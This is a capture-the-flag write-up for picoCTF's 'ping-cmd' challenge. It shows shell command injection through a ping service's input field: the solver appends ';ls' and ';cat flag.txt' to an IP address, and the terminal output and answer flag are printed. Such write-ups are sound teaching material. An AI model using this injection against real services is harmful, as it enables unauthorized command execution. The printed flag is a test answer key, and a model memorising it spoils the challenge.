# ping-cmd

## 題目描述 (Description)

Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

### 提示 (Hints)

1. Hint 1  
    The program uses a shell command behind the scenes.
2. Hint 2  
    Sometimes, You can run more than one command at a time.

## 解題思路 (Solution Walkthrough)

1. **第一步**：只要在結尾加上分號，就可以在一行內執行多個指令

    ```text
    ┌──(kali㉿kali)-[~/Desktop]
    └─$ nc mysterious-sea.picoctf.net 53079
    Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;ls  
    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.50 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.62 ms

    --- 8.8.8.8 ping statistics ---
    2 packets transmitted, 2 received, 0% packet loss, time 1002ms
    rtt min/avg/max/mdev = 9.501/9.558/9.616/0.057 ms
    flag.txt
    script.sh
                                                                                                                                                                                                                
    ┌──(kali㉿kali)-[~/Desktop]
    └─$ nc mysterious-sea.picoctf.net 53079
    Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;cat flag.txt
    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.51 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.56 ms

    --- 8.8.8.8 ping statistics ---
    2 packets transmitted, 2 received, 0% packet loss, time 1002ms
    rtt min/avg/max/mdev = 9.511/9.537/9.563/0.026 ms
    picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0} 
    ```

## Flag

```text
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0} 
```
